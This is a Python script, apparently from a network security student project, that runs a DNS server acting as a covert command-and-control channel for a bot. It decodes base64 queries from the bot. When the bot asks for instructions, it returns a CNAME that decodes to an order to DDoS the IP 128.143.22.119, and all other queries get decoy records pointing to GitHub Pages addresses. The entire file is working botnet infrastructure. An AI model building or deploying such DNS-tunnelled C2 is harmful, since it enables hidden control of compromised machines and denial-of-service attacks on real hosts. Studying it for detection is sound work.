# Runs on EC2 instance as a DNS server. Responds to encoded message from bot.py

import socket
import sys
import dns
from dns import query
from dns import message
from dns import name
import dns.rdtypes.ANY.CNAME
import dnslib
from dnslib import RR, DNSRecord, DNSQuestion, QTYPE
import textwrap
import binascii
import base64

# This listens for any tcp connections and prints what was recieved

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 53              # Arbitrary non-privileged port
#msg = ''

z ='''
$TTL 300
$ORIGIN netsec-project.me
@       IN      A      185.199.108.153
@       IN      A      185.199.109.153
@       IN      A      185.199.110.153
@       IN      A      185.199.111.153

www     IN      CNAME   mw2gd.github.io.
'''

z2 ='''
$TTL 300
$ORIGIN netsec-project.me
@     IN CNAME RERPUyAxMjguMTQzLjIyLjExOQ00
'''

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
sock.bind((HOST, PORT));


while 1:
	#print('listening')
	data, addr = sock.recvfrom(1024) # recieve the dns query packet
	query = DNSRecord.parse(data) # parse packet into 
	domain = str(query.get_q().get_qname())[:-1] # parse domain used
	domain = domain.split('.')[0]
	response = query.reply() 

	#print("Recieved Req for " + domain)
	if (query.get_q().qtype == 5):
		#print("begin responding...")
		
		tmp    = 0
		tmp2   = ""

		for i in range(0, len(domain)):
			if (domain[ len(domain) - 1 - i] == '0'):
				tmp+=1
				tmp2+="="
				break
				
		domain = domain[0: len(domain) - tmp] + tmp2

		print(domain)

		#print("domain req: " + domain)

		try: 
			secret = base64.b64decode(domain)
			print(secret)
			if (secret == b'requesting instructions'):#"requesting instruction"):
				#print("woooohoooooo")
				for rr in RR.fromZone(textwrap.dedent(z2)):
					response.add_answer(rr)
				sock.sendto(response.pack(), addr)  # send reply


			else:
				for rr in RR.fromZone(textwrap.dedent(z)):
					response.add_answer(rr)
				sock.sendto(response.pack(), addr)  # send reply

		except:
			#print("here")
			for rr in RR.fromZone(textwrap.dedent(z)):
				response.add_answer(rr)
			sock.sendto(response.pack(), addr)  # send reply

	else:
		for rr in RR.fromZone(textwrap.dedent(z)):
			response.add_answer(rr)

		sock.sendto(response.pack(), addr)  # send reply
